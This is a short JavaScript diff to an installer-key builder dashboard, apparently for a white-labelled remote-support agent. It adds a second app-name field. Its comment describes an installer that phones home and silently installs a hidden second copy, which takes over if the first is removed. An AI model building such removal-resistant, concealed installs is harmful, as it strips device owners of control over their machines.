@@ -1377,8 +1377,16 @@ $('#new-key').addEventListener('click', openBuild);
 $('#build-cancel').addEventListener('click', () => { closeBuild(); loadKeys(); });
 $('#build-modal').addEventListener('click', (e) => { if (e.target.id === 'build-modal') { closeBuild(); loadKeys(); } });
 $('#build-create').addEventListener('click', async () => {
+  // Dual-install: if a second software name is given, the key's metadata
+  // carries both names. The installer phones home at install time (/api/key-meta)
+  // and, seeing appName2, installs itself twice under both names — one device
+  // entry in the dashboard, the second copy taking over if the first is removed.
+  // Reject anything that would collide with our dash-separated filename format.
+  const appName2Raw = ($('#b-appname2') && $('#b-appname2').value || '').trim();
+  if (appName2Raw && /-{2,}/.test(appName2Raw)) { toast('Second name cannot contain "--".', 'err'); return; }
   const meta = {
     appName: $('#b-appname').value.trim(),   // white-label: the installer's name (default Support)
+    appName2: appName2Raw || undefined,
     company: $('#b-company').value.trim(),
     site: $('#b-site').value.trim(),
     department: $('#b-dept').value.trim(),
